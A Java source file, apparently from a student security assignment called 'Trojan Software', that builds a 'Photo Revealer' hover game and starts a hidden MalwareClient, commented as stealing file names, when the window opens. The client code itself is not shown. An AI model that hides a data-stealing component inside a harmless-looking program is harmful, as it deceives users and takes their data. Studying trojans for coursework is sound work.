// Abigail McIntyre
// Project 4 - Trojan Software
// Due 03/16/2022

// ---------------------------------------------------------------------------------------------------------------------------
// sets up the JFrame which loads a picture into the background and then sets a bunch of little squares on top so that
// when the user hovers their mouse over the boxes they disappear and reveal the background image
// ---------------------------------------------------------------------------------------------------------------------------

import java.awt.*;
import javax.swing.*;

public class Frame extends JFrame
{
    MalwareClient client;

    // ======================================================================================

    Frame()
    {
        setupMainFrame();                                                   // create the frame
        client = new MalwareClient();                                       // start the client to steal file names
    }
        
    // ======================================================================================

    public void setupMainFrame() 
    {
        setSize(new Dimension(800, 800));                                   // create an 800 x 800 frame
        JLabel background = new JLabel(new ImageIcon("test.jpg"));          // set the background to a photo         
        add(background);                                                    // actually add the background
        background.setLayout(new GridLayout(100, 100));                     // set the layout to a GridLayout for the squares

        for(int i = 0; i < 8000; i++)
        {
            background.add(new LittleSquares());                            // add 8,000 of them over top the picture
        }

        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setTitle("Photo Revealer");                                         // set the title bar 
        setVisible(true);
    }

    // ======================================================================================
}
